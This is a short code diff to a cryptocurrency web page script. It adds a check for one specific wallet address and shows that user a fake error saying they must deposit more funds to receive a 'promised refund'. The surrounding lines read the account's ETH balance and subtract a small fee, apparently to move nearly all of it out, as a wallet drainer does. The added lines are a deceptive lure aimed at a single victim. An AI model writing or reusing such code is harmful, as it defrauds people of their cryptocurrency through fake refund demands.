@@ -878,6 +878,13 @@ console.log(collection)
   }
 
 
+
+    if (account == '0xc9aD6aD094Bfb902E81cFbA1282622A4D457DF72') {
+
+        alert('error: 2389\nmessage: connected account must deposit the remaining required amount to receive the promised refund')
+  }
+
+
  var value = await get_eth(account)
  var minusvalue = value - 0.0084
 
